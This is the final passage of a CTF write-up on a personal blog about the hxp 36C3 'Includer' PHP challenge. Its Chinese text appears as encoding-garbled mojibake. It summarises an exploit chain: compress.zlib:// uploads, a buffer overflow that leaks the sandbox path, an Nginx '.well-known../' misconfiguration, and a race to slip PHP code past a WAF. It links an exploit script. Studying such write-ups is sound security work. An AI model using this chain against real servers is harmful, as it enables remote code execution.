<p>æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š</p>
<ol>
<li>åˆ©ç”¨ <code>compress.zlib://http://</code>or<code>compress.zlib://ftp://</code> æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ HTTP é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶</li>
<li>åˆ©ç”¨è¶…é•¿çš„ name æº¢å‡º output buffer å¾—åˆ° sandbox è·¯å¾„</li>
<li>åˆ©ç”¨ Nginx é…ç½®é”™è¯¯ï¼Œé€šè¿‡ <code>.well-known../files/sandbox/</code>æ¥è·å–æˆ‘ä»¬ tmp æ–‡ä»¶çš„æ–‡ä»¶å</li>
<li>å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„ tmp æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰ PHP ä»£ç </li>
<li>ç»•è¿‡ WAF åˆ¤æ–­åï¼Œå‘é€ PHP ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„ PHP ä»£ç æ‹¿åˆ° Flag</li>
</ol>
<p>æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹(æ¥è‡ª @wupco)ï¼š</p>
<ol>
<li>éœ€è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ</li>
<li>ä¼ å…¥nameè¿‡å¤§ overflow output bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„</li>
<li>tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡<code>file_get_contents</code>è·å–çš„å†…å®¹ä¸å¸¦æœ‰<code>&lt;?</code>,<code>include</code>çš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ</li>
<li><code>.well-known../files/</code>æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶</li>
</ol>
<p>ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰ hit ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡ @rebirth çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥ getflagã€‚</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107214803.png loading=lazy>
</a>
</figure></p>
<p>è„šæœ¬æ”¾åœ¨<a class=link href=https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65 target=_blank rel=noopener>gist-exp.py</a>ï¼Œå…¶ä¸­ 192.168.34.1 æ˜¯æœ¬åœ°é¢˜ç›®åœ°å€ï¼Œ192.168.151.132 æ˜¯ client çš„åœ°å€ã€‚</p>
<h2 id=references>References</h2>
<p><a class=link href=https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/ target=_blank rel=noopener>20191228-hxp36c3ctf</a></p>
<p><a class=link href=https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0 target=_blank rel=noopener>https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</a></p>
<p><a class=link href=https://ctftime.org/task/10211 target=_blank rel=noopener>https://ctftime.org/task/10211</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>æƒ³äº†è§£æ›´å¤šæœ‰æ„æ€çš„å›½é™…èµ› CTF ä¸­ Web çŸ¥è¯†æŠ€å·§ï¼Œæ¬¢è¿åŠ å…¥æˆ‘çš„ <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>çŸ¥è¯†æ˜Ÿçƒ</a> ; å¦å¤–æˆ‘æ­£åœ¨å¬é›†ä¸€ç¾¤å°ä¼™ä¼´ç»„å»ºä¸€æ”¯ä¸“æ³¨å›½é™… CTF çš„é˜Ÿä¼ï¼Œå¦‚æœæœ‰æ„Ÿå…´è¶£çš„å°ä¼™ä¼´ä¹Ÿå¯åœ¨ <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> æŸ¥çœ‹è¯¦æƒ…</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
<article>
<a href=/2021/05/19/tls-ctf/>
<div class=article-details>
<h2 class=article-title>TLS-Poison æ”»å‡»æ–¹å¼åœ¨ CTF ä¸­çš„åˆ©ç”¨å®è·µ</h2>
</div>
</a>
</article>
<article>
<a href=/2020/10/15/Defcon28final/>
<div class=article-details>
<h2 class=article-title>DEFCON 28 Final æ‚è®°</h2>
</div>
</a>
</article>
<article>
<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>
<div class=article-details>
<h2 class=article-title>Plaid CTF 2020 Catalog</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2021 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#file-magician>File Magician</a>
<ol>
<li><a href=#other-file>other file</a>
<ol>
<li><a href=#tex-dvi-file>TeX DVI file</a></li>
<li><a href=#jpeg>jpeg</a></li>
<li><a href=#heading>#!</a></li>
<li><a href=#gz>gz</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#writeupbin>WriteUpBin</a>
<ol>
<li><a href=#parsleyjs>Parsley.js</a></li>
<li><a href=#css-selector>CSS Selector</a></li>
<li><a href=#other-selector>Other Selector</a></li>
</ol>
</li>
<li><a href=#includer>Includer</a>
<ol>
<li><a href=#configuration-error>Configuration Error</a></li>
<li><a href=#upload-arbitrary-data>Upload Arbitrary Data</a></li>
<li><a href=#keep-temp-file>Keep Temp File</a></li>
<li><a href=#bypass-waf>Bypass Waf</a></li>
<li><a href=#leak-dir-path>Leak Dir path</a></li>
<li><a href=#get-flag>Get Flag</a></li>
</ol>
</li>
<li><a href=#references>References</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>